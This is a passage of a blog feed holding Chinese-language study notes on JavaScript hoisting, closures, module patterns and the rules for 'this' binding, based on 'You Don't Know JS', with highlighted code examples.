TypeError!</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="函数优先"><a href="#函数优先" class="headerlink" title="函数优先"></a>函数优先</h4><p class="tip">函数声明和变量声明都会被提升。但一个微妙的细节（可以 在拥有多个“重复的”声明的代码中出现）是，函数会首先被提升，然后才是变量。</p><p>考虑这段代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">foo(); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1 被打印了，而不是 2！这个代码段被 引擎 解释执行为：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(); <span class="comment">// 1</span></span><br><span class="line"></span><br><span class="line">foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意那个 var foo 是一个重复（因此被无视）的声明，即便它出现在 function foo()… 声明之前，因为函数声明是在普通变量之前被提升的。</p><p>虽然多个/重复的 var 声明实质上是被忽略的，但是后续的函数声明确实会覆盖前一个。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">foo(); <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">1</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">2</span> );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="number">3</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二、闭包"><a href="#二、闭包" class="headerlink" title="二、闭包"></a>二、闭包</h2><h3 id="什么是闭包"><a href="#什么是闭包" class="headerlink" title="什么是闭包"></a>什么是闭包</h3><p>闭包对于大多数熟练的JavaScript也算是一个模糊不清的概念，什么是闭包呢，闭包能给我们带来什么好处和坏处？</p><p class="tip">简单来说可以用一句话概括闭包的特性与作用：闭包就是函数能够记住并访问它的词法作用域，即使这个函数在它的词法作用域外执行</p><blockquote><p>让我们跳进代码来说明这个定义：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><p>上面的代码段被认为是函数 bar() 在函数 foo() 的作用域上有一个 闭包.换一种略有不同的说法是，bar() 闭住了 foo() 的作用域。为什么？因为 bar() 嵌套地出现在 foo() 内部。就这么简单。</p><h3 id="闭包的特性"><a href="#闭包的特性" class="headerlink" title="闭包的特性"></a>闭包的特性</h3><p>根据闭包的定义我们能很容易记住其两大特点：</p><p>1、能够记住并访问它的词法作用域<br>2、即使在它的作用域外执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> baz = foo();</span><br><span class="line"></span><br><span class="line">baz(); <span class="comment">// 2 -- 哇噢，看到闭包了，伙计。</span></span><br></pre></td></tr></table></figure><ul><li>bar() 被执行了，必然的。但是在这个例子中，它是在它被声明的词法作用域 外部 被执行的。</li><li>foo() 被执行之后，一般说来我们会期望 foo() 的整个内部作用域都将消失，因为我们知道 引擎 启用了 垃圾回收器 在内存不再被使用时来回收它们。因为很显然 foo() 的内容不再被使用了，所以看起来它们很自然地应该被认为是 消失了。</li><li>但是闭包的“魔法”不会让这发生。内部的作用域实际上 依然 “在使用”，因此将不会消失。谁在使用它？函数 bar() 本身。</li><li>有赖于它被声明的位置，bar() 拥有一个词法作用域闭包覆盖着 foo() 的内部作用域，闭包为了能使 bar() 在以后任意的时刻可以引用这个作用域而保持它的存在。</li><li>bar() 依然拥有对那个作用域的引用，而这个引用称为闭包。</li></ul><h3 id="闭包使用场景"><a href="#闭包使用场景" class="headerlink" title="闭包使用场景"></a>闭包使用场景</h3><h4 id="无处不在的闭包"><a href="#无处不在的闭包" class="headerlink" title="无处不在的闭包"></a>无处不在的闭包</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wait</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( message );</span><br><span class="line">&#125;, <span class="number">1000</span> );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wait( <span class="string">"Hello, closure!"</span> );</span><br></pre></td></tr></table></figure><ul><li>我们拿来一个内部函数（名为 timer）将它传递给 setTimeout(..)。但是 timer 拥有覆盖 wait(..) 的作用域的闭包，实际上保持并使用着对变量 message 的引用。</li><li>在我们执行 wait(..) 一千毫秒之后，要不是内部函数 timer 依然拥有覆盖着 wait() 内部作用域的闭包，它早就会消失了。</li><li>在 引擎 的内脏深处，内建的工具 setTimeout(..) 拥有一些参数的引用，可能称为 fn 或者 func 或者其他诸如此类的东西。引擎 去调用这个函数，它调用我们的内部 timer 函数，而词法作用域依然完好无损。</li></ul><h4 id="循环-闭包"><a href="#循环-闭包" class="headerlink" title="循环 + 闭包"></a>循环 + 闭包</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( i );</span><br><span class="line">&#125;, i*<span class="number">1000</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的精神是，我们一般将 期待 它的行为是分别打印数字“1”，“2”，……“5”，一次一个，一秒一个<br>实际上，如果你运行这段代码，你会得到“6”被打印5次，一秒一个。</p><p class="tip">我们试图 暗示 在迭代期间，循环的每次迭代都“捕捉”一份对 i 的拷贝。但是，虽然所有这5个函数在每次循环迭代中分离地定义，由于作用域的工作方式，它们 都闭包在同一个共享的全局作用域上，而它事实上只有一个 i</p><p>如何解决这个问题呢，定义一个新的作用域，在每次迭代时持有值 i 的一个拷贝</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">j</span>)</span>&#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( j );</span><br><span class="line">&#125;, j*<span class="number">1000</span> );</span><br><span class="line">&#125;)( i );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CoolModule</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> something = <span class="string">"cool"</span>;</span><br><span class="line"><span class="keyword">var</span> another = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( something );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doAnother</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( another.join( <span class="string">" ! "</span> ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">doSomething: doSomething,</span><br><span class="line">doAnother: doAnother</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = CoolModule();</span><br><span class="line"></span><br><span class="line">foo.doSomething(); <span class="comment">// cool</span></span><br><span class="line">foo.doAnother(); <span class="comment">// 1 ! 2 ! 3</span></span><br></pre></td></tr></table></figure><p>首先，CoolModule() 只是一个函数，但它 必须被调用 才能成为一个被创建的模块实例。没有外部函数的执行，内部作用域的创建和闭包都不会发生。</p><p>第二，CoolModule() 函数返回一个对象，通过对象字面量语法 { key: value, … } 标记。这个我们返回的对象拥有指向我们内部函数的引用，但是 没有 指向我们内部数据变量的引用。我们可以将它们保持为隐藏和私有的。可以很恰当地认为这个返回值对象实质上是一个 我们模块的公有API。</p><p>这个返回值对象最终被赋值给外部变量 foo，然后我们可以在这个API上访问那些属性，比如 foo.doSomething()</p><h4 id="现代的模块"><a href="#现代的模块" class="headerlink" title="现代的模块"></a>现代的模块</h4><p class="tip">各种模块依赖加载器/消息机制实质上都是将这种模块定义包装进一个友好的API。与其检视任意一个特定的库，不如让我 （仅）为了说明的目的 展示一个 非常简单 的概念证明：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MyModules = (<span class="function"><span class="keyword">function</span> <span class="title">Manager</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> modules = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">name, deps, impl</span>) </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;deps.length; i++) &#123;</span><br><span class="line">deps[i] = modules[deps[i]];</span><br><span class="line">&#125;</span><br><span class="line">modules[name] = impl.apply( impl, deps );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> modules[name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">define: define,</span><br><span class="line">get: get</span><br><span class="line">&#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;参考来源&quot;&gt;&lt;a href=&quot;#参考来源&quot; class=&quot;headerlink&quot; title=&quot;参考来源&quot;&gt;&lt;/a&gt;参考来源&lt;/h2&gt;&lt;p&gt;本文是you don’t know js系列的 &lt;a href=&quot;https://github.com/getify/You-Dont-Know-JS/tree/1ed-zh-CN/scope%20%26%20closures&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;作用域与闭包&lt;/a&gt; 笔记&lt;/p&gt;
&lt;h2 id=&quot;一、作用域&quot;&gt;&lt;a href=&quot;#一、作用域&quot; class=&quot;headerlink&quot; title=&quot;一、作用域&quot;&gt;&lt;/a&gt;一、作用域&lt;/h2&gt;&lt;h3 id=&quot;什么是作用域&quot;&gt;&lt;a href=&quot;#什么是作用域&quot; class=&quot;headerlink&quot; title=&quot;什么是作用域&quot;&gt;&lt;/a&gt;什么是作用域&lt;/h3&gt;&lt;p&gt;几乎所有计算机语言都提供了最基础的变量模型，变量它允许人们将值存入变量中，并且再后续从变量中取值或修改值。&lt;/p&gt;
&lt;p&gt;但是变量的存储同样会带来几个问题，我们如何存储数据到变量上，又如何查找变量的值。这样的一些列规则我们将其称之为作用域&lt;/p&gt;
&lt;p&gt;&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>this &amp; 对象原型</title>
    <link href="http://zhoushaw.github.io/2019/04/01/learning/book-notes/this&amp;%E5%AF%B9%E8%B1%A1%E5%8E%9F%E5%9E%8B/"/>
    <id>http://zhoushaw.github.io/2019/04/01/learning/book-notes/this&amp;对象原型/</id>
    <published>2019-03-31T20:36:35.000Z</published>
    <updated>2019-04-23T13:22:02.323Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、this关键词"><a href="#一、this关键词" class="headerlink" title="一、this关键词"></a>一、this关键词</h2><p class="tip">this是关键词，表示指向的索引位置</p><p>很多人对于this最终指向常见的误解是，this是编写时绑定的，通常会将其认为成一下几种情况：</p><p>1、认为this指向，foo函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><div><a id="more"></a></div><p>2、认为this指向，obj对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="keyword">this</span>.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">a: <span class="number">2</span>,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar = obj.foo; <span class="comment">// 函数引用！</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">"oops, global"</span>; <span class="comment">// `a` 也是一个全局对象的属性</span></span><br><span class="line"></span><br><span class="line">bar(); <span class="comment">// "oops, global"</span></span><br></pre></td></tr></table></figure><h3 id="可以大致分为以下几种情况："><a href="#可以大致分为以下几种情况：" class="headerlink" title="可以大致分为以下几种情况："></a>可以大致分为以下几种情况：</h3><p>函数调用方式与内部this指针关系<br>1.直接调用:函数内部this指向全局对象window<br>2.通过对象使用点来调用:函数内部this指向调用对象<br>3.触发事件调用函数:函数内部的this指向触发事件的对象<br>4.以new的方式来调用:函数内部this指向本次函数执行时对应的一个匿名对象（以new的方式创建的函数，函数名的首字母一般以大写字母开始）<br>构造函数 ，是一种特殊的方法。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</p><p>5.通过call的方法来间接调用方法:函数内部this指向call方法的第一参数对象<br>有点:我们可以创建结构相同，但内容不同的对象</p><p>可参考: <a href="http://www.ruanyifeng.com/blog/2018/06/javascript-this.html" target="_blank" rel="noopener">JavaScript 的this原理</a></p><p>按照本文中的分类将其分为四大块：</p><p>默认绑定、隐含绑定、明确绑定、new 绑定</p><h3 id="仅仅是规则"><a href="#仅仅是规则" class="headerlink" title="仅仅是规则"></a>仅仅是规则</h3><p>this的最终指向可以将其分为大致四种规则</p><h4 id="默认绑定"><a href="#默认绑定" class="headerlink" title="默认绑定"></a>默认绑定</h4><p>我们要考察的第一种规则源于函数调用的最常见的情况：独立函数调用</p><p>在非<code>strict mode</code>模式下，独立函数调用默认指向全局对象window，在<code>strict mode</code>模式下默认绑定 来说全局对象是不合法，所以 <code>this</code> 将被设置为 <code>undefined</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = 2;</span><br><span class="line"></span><br><span class="line">foo(); // 2</span><br></pre></td></tr></table></figure><h4 id="隐含绑定"><a href="#隐含绑定" class="headerlink" title="隐含绑定"></a>隐含绑定</h4><p>另一种要考虑的规则是：调用点是否有一个环境对象（<code>context object</code>），也称为拥有者（<code>owning</code>）或容器（<code>containing</code>）对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.foo(); // 2</span><br></pre></td></tr></table></figure><p class="tip">无论 foo() 是否一开始就在 obj 上被声明，还是后来作为引用添加（如上面代码所示），这个 函数 都不被 obj 所真正“拥有”或“包含”.调用点 使用 obj 环境来 引用 函数，所以你 可以说 obj 对象在函数被调用的时间点上“拥有”或“包含”这个 函数引用。</p><p>只有对象属性引用链的最后一层是影响调用点的。比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj2 = &#123;</span><br><span class="line">a: 42,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var obj1 = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">obj2: obj2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj1.obj2.foo(); // 42</span><br></pre></td></tr></table></figure><h5 id="隐含丢失"><a href="#隐含丢失" class="headerlink" title="隐含丢失"></a>隐含丢失</h5><p>传递一个回调函数时：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function doFoo(fn) &#123;</span><br><span class="line">// `fn` 只不过 `foo` 的另一个引用</span><br><span class="line"></span><br><span class="line">fn(); // &lt;-- 调用点!</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var a = &quot;oops, global&quot;; // `a` 也是一个全局对象的属性</span><br><span class="line"></span><br><span class="line">doFoo( obj.foo ); // &quot;oops, global&quot;</span><br></pre></td></tr></table></figure><p>那么如果接收你所传递回调的函数不是你的，而是语言内建的呢？没有区别，同样的结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var a = &quot;oops, global&quot;; // `a` 也是一个全局对象的属性</span><br><span class="line"></span><br><span class="line">setTimeout( obj.foo, 100 ); // &quot;oops, global&quot;</span><br></pre></td></tr></table></figure><p>正如我们刚刚看到的，我们的回调函数丢掉他们的 this 绑定是十分常见的事情。但是 this 使我们吃惊的另一种方式是，接收我们回调的函数故意改变调用的 this。那些很流行的 JavaScript 库中的事件处理器就十分喜欢强制你的回调的 this 指向触发事件的 DOM 元素。虽然有时这很有用，但其他时候这简直能气死人。不幸的是，这些工具很少给你选择。</p><h4 id="明确绑定"><a href="#明确绑定" class="headerlink" title="明确绑定"></a>明确绑定</h4><p>JavaScript 语言中的“所有”函数都有一些工具。具体地说，函数拥有 call(..) 和 apply(..) 方法。</p><p>这些工具如何工作？它们接收的第一个参数都是一个用于 this 的对象，之后使用这个指定的 this 来调用函数。因为你已经直接指明你想让 this 是什么，所以我们称这种方式为 明确绑定（explicit binding)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">foo.call( obj ); // 2</span><br></pre></td></tr></table></figure><h5 id="API-调用的“环境”"><a href="#API-调用的“环境”" class="headerlink" title="API 调用的“环境”"></a>API 调用的“环境”</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function foo(el) &#123;</span><br><span class="line">console.log( el, this.id );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">id: &quot;awesome&quot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 使用 `obj` 作为 `this` 来调用 `foo(..)`</span><br><span class="line">[1, 2, 3].forEach( foo, obj ); // 1 awesome  2 awesome  3 awesome</span><br></pre></td></tr></table></figure><h4 id="new-绑定"><a href="#new-绑定" class="headerlink" title="new 绑定"></a>new 绑定</h4><p>当使用 new 操作符来初始化一个类时，这个类的构造器就会被调用。通常看起来像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">something = new MyClass(..);</span><br></pre></td></tr></table></figure><p class="tip">实际上 JavaScript 的机制和 new 在 JS 中的用法所暗示的面向类的功能 没有任何联系。在 JS 中，构造器 仅仅是一个函数，它们偶然地与前置的 new 操作符一起调用。它们不依附于类，它们也不初始化一个类。它们甚至不是一种特殊的函数类型。它们本质上只是一般的函数，在被使用 new 来调用时改变了行为。</p><blockquote><p>当在函数前面被加入 new 调用时，也就是构造器调用时，下面这些事情会自动完成：</p></blockquote><ul><li>一个全新的对象会凭空创建（就是被构建）</li><li>这个新构建的对象会被接入原形链（[[Prototype]]-linked）</li><li>这个新构建的对象被设置为函数调用的 this 绑定</li><li>除非函数返回一个它自己的其他 对象，否则这个被 new 调用的函数将 自动 返回这个新构建的对象。</li></ul><p>简单来说通过new方法初始化的构造器this指向函数本身</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function foo(a) &#123;</span><br><span class="line">this.a = a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var bar = new foo( 2 );</span><br><span class="line">console.log( bar.a ); // 2</span><br></pre></td></tr></table></figure><h3 id="一切皆有顺序"><a href="#一切皆有顺序" class="headerlink" title="一切皆有顺序"></a>一切皆有顺序</h3><p class="tip">上面已经揭示了四种this绑定最终指向的规则，但是指向的规则可能会出现重叠的情况，当两种以上的规则出现后如何抉择优先顺序呢。</p><ul><li>函数是通过 new 被调用的吗（new 绑定）？如果是，this 就是新构建的对象。<ul><li>var bar = new foo()</li></ul></li><li>函数是通过 call 或 apply 被调用（明确绑定），甚至是隐藏在 bind 硬绑定 之中吗？如果是，this 